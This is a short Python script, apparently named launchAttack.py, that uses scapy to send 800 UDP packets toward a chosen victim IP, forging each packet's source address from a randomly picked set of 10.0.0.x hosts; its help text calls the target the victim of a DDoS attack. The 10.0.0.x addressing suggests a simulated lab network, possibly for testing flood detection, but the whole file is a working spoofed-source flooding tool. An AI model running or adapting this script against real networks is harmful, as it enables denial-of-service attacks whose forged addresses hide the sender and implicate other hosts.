import sys
import time
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from os import popen
from scapy.all import sendp, IP, UDP, Ether
from random import randint
from argparse import ArgumentParser

def getAttackerIP(num_host, num_atk_host, dst_ip, xterm_host_ip):
    attacker_ip = []
    number = []
    while len(attacker_ip) != num_atk_host:
        randnum = randint(1,num_host)
        while randnum in number or dst_ip == f'10.0.0.{randnum}' or xterm_host_ip == f'10.0.0.{randnum}':
            randnum = randint(1,num_host)
        number.append(randnum)
        attacker_ip.append(f'10.0.0.{randnum}')
    return attacker_ip

def main(xterm_host_ip ,dst_ip, num_host, num_atk_host):
    if(dst_ip is None):
        print('Type the following command to get some help\npython3 launchAttack.py --h')
        exit(0)
    assert num_host > num_atk_host//2
    assert dst_ip != xterm_host_ip
    interface = popen('ifconfig | awk \'/eth0/ {print $1}\'').read()
    NUM_PACKET = 800
    D_PORT = 5
    S_PORT = 80
    attack_ip = getAttackerIP(num_host, num_atk_host, dst_ip, xterm_host_ip)                                                               
    for i in range(NUM_PACKET):
        packets = Ether() / IP(dst=dst_ip, src=attack_ip[randint(0,num_atk_host-1)]) / UDP(dport = D_PORT, sport=S_PORT)
        sendp(packets, iface=interface.rstrip(), inter=0.2)
        print(f'Send attacking packet: {repr(packets)}')


if __name__ == '__main__':
    parser = ArgumentParser()
    parser.add_argument('--xterm_host_ip', type=str, help='Xterm host ip.')
    parser.add_argument('--dst_ip', type=str, help='The victim ip of DDOS attack.')
    parser.add_argument('--num_host', type=int, help='Number of hosts.')
    parser.add_argument('--num_atk_host', type=int, help='Number of attacking hosts.')
    args = parser.parse_args()
    main(**vars(args))